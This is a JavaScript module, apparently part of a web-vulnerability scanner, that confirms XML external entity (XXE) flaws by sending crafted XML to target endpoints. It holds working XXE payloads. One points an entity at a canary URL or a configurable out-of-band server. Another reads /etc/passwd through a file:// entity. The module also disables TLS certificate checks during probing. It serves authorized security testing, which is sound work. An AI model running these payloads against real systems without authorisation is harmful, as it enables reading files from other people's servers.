const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { endpointCandidates } = require('./massassign_confirm');

// POST an XML body with an external entity. On the lab/OOB it resolves to a
// canary whose proof lives only in the response; on a real target a file://
// entity reads /etc/passwd (matched by signature) — neither proof is present in
// the request, so a mere body echo cannot fake it.
class XxeConfirm extends BaseModule {
  static moduleName = 'xxe_confirm';
  static phase = 'P6c';
  static toolsNeeded = [];

  async execute() {
    const candidates = endpointCandidates(this.workspace, this.scope, true);
    if (!candidates.length) return new ModuleResult({ module: XxeConfirm.moduleName, status: 'skipped', errors: ['No candidate endpoints'] });
    const ua = this.config.user_agent || 'WebKiller/2.0';
    const confirmed = [];
    const PROOF = 'WK_CANARY_PROVEN';
    pushInsecureTLS();
    try {
      for (const ep of candidates.slice(0, this.config.xxe_max_urls || 80)) {
        let parsed; try { parsed = new URL(ep); } catch { continue; }
        const probes = [
          { xml: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY wk SYSTEM "${parsed.protocol}//${parsed.host}/__canary">]><foo>&wk;</foo>`, test: (b) => b.includes(PROOF), note: 'external entity resolved to the in-scope canary' },
          { xml: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY wk SYSTEM "file:///etc/passwd">]><foo>&wk;</foo>`, test: (b) => /root:.*?:0:0:/.test(b), note: 'external entity read /etc/passwd' },
        ];
        if (this.config.oob_url) probes.unshift({ xml: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY wk SYSTEM "${this.config.oob_url}">]><foo>&wk;</foo>`, test: (b) => b.includes(this.config.oob_marker || PROOF), note: 'external entity hit the OOB server' });
        for (const probe of probes) {
          try {
            const resp = await fetch(ep, { method: 'POST', headers: { 'User-Agent': ua, 'Content-Type': 'application/xml' }, body: probe.xml, redirect: 'manual', signal: AbortSignal.timeout(8000) });
            const body = await resp.text();
            if (probe.test(body)) {
              confirmed.push({ name: 'XXE (external entity)', severity: 'high', url: ep, evidence: { note: probe.note }, type: 'dast_confirmed', vuln_class: 'xxe', module: XxeConfirm.moduleName });
              break;
            }
          } catch { /* skip */ }
        }
      }
    } finally { popInsecureTLS(); }
    const out = dedup(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: XxeConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'xxe-canary' });
  }

  _candidates() {
    const set = new Set();
    for (const u of [...this.workspace.readLines('urls.txt'), ...this.workspace.readLines('live.txt')]) {
      try { const p = new URL(u); set.add(p.origin + p.pathname); } catch { /* skip */ }
    }
    return [...set];
  }
}
function dedup(arr) { const s = new Set(); return arr.filter(c => { if (s.has(c.url)) return false; s.add(c.url); return true; }); }
module.exports = XxeConfirm;
